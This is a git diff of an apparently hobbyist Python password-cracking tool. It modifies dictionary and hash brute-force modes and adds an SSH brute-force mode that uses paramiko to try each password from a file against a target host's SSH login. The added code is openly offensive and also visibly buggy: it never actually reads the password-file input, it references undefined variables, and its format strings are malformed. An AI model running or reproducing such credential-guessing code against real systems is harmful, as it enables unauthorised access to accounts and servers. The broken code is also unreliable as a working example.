@@ -6,7 +6,7 @@ import time
 import requests
 import random
 from threading import Thread
-import os
+import os, paramiko, sys, socket
 import colorama
 from colorama import Fore, Back, Style
 
@@ -40,7 +40,7 @@ type_of_attack = int(input(f"{Fore.LIGHTMAGENTA_EX}\nWhat type of attack do you 
                            "1. Dictionary Attack\n"
                            "2. Brute Force Attack\n"
                            "3. Random Login Attack\n"
-                           "4.SSH/FTP Attack\n\n"
+                           "4.SSH BruteForce Attack\n\n"
                            "Enter your choice: "))
 disc_list = []
 
@@ -82,6 +82,7 @@ if type_of_attack == 1:#dictionary attack option
         
 
 if type_of_attack == 2:#Bruteforce attacking option
+    
     hash = str(input("[+]Enter the password hash: "))
     try:
         type_of_characters = int(input(f"{Fore.LIGHTMAGENTA_EX}\nWhat type of characters do you want to try?\n\n"
@@ -155,10 +156,10 @@ if type_of_attack == 2:#Bruteforce attacking option
 
             # These print information for the user on the progress of the crack.
             #print("Similar Password: "+ gen_str )
-            print(f"{Fore.YELLOW}We are currently at ", (counter / (time.time() - start)), "attempts per seconds")
-            print(f"{Fore.YELLOW}It has been ", time.time() - start, " seconds!")
-            print(f"{Fore.YELLOW}We have tried ", counter, " possible passwords!")
-            print(f"{Fore.YELLOW}trying.......... " + str(gen_str))
+            #print(f"{Fore.YELLOW}We are currently at ", (counter / (time.time() - start)), "attempts per seconds")
+            #print(f"{Fore.YELLOW}It has been ", time.time() - start, " seconds!")
+            #print(f"{Fore.YELLOW}We have tried ", counter, " possible passwords!")
+            print(f"{Fore.YELLOW}trying.......... " + gen_str)
 
 
             if len(hash) == 32:
@@ -166,7 +167,7 @@ if type_of_attack == 2:#Bruteforce attacking option
             elif len(hash) == 40:
                 generated_hash = hashlib.sha1(gen_str.encode("utf-8")).hexdigest()
             elif len(hash) == 64:
-                generated_hash = hashlib.sha256(repr(gen_str).encode("utf-8")).hexdigest()
+                generated_hash = hashlib.sha256(gen_str.encode("utf-8")).hexdigest()
 
             if hash == generated_hash:
                     # This takes the time at which the program finished.
@@ -191,8 +192,6 @@ if type_of_attack == 2:#Bruteforce attacking option
         print(Fore.RED + "\n[!]Make sure you enter the hash password!")
     except KeyboardInterrupt:
         print(f"{Fore.RED} \n[!]The hacking process was interupted , try again!")
-    else:
-        print(Fore.RED + "\n [!]Something is wrong, sorry for the inconveniences, kindly try again later!. ")
 if type_of_attack == 3:
     # define the webpage you want to crack
 
@@ -240,4 +239,52 @@ if type_of_attack == 3:
         print(Fore.RED + "\n [!]Something went wrong!, this maybe due to internet connection or you entered an incorrect url.")
         
 if type_of_attack == 4:
-    print("[+]We are still working on this feature , come back later.")
+    global host,user, line, input_file
+    
+    line ="\n--------------------------------------------------\n"
+    try:
+        host = input("[*] Enter Target Host Address: ")
+        user = input("[*]Enter SSH Username: ")
+        input_file =("[*] Enter SSH Password File: ")
+        
+        if os.path.exists(input_file) == False:
+            print("\n[*] File Path Does Not Exist !!")
+            sys.exit(4)
+    except KeyboardInterrupt:
+        print("\n\n [*] User Interrupted the process")
+        sys.exit(3)
+        
+    def ssh_connect(password, code = 0):
+        ssh = paramiko.SSHClient()
+        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+        
+        try:
+            ssh.connect(host,port=22, username=user,password=password)
+        except paramiko.AuthenticationException:
+            code = 1
+        except socket.error as e:
+            code = 2
+            
+        ssh.close()
+        return code
+    input_file = open(input_file)
+    
+    print('')
+    
+    for i in input_file.readlines():
+        password = i.strip("\n")
+        try:
+            response = ssh_connect(password)
+            
+            if response == 0:
+                print("%s[*]User: %s [*] Pass Found: %s&s" % (line,username.passsword,line))
+                sys.exit(0)
+            elif response == 1:
+                print("[*] User: %s [*] Pass %s ==>Login Incorrect !!! <==" & (username, password))
+            elif response == 2:
+                print("[*]Connection Could Not Be Established To Address: %s" %(host))
+                sys.exit(2)
+        except Exception as e:
+            print('0')
+            pass
+    input_file.close()
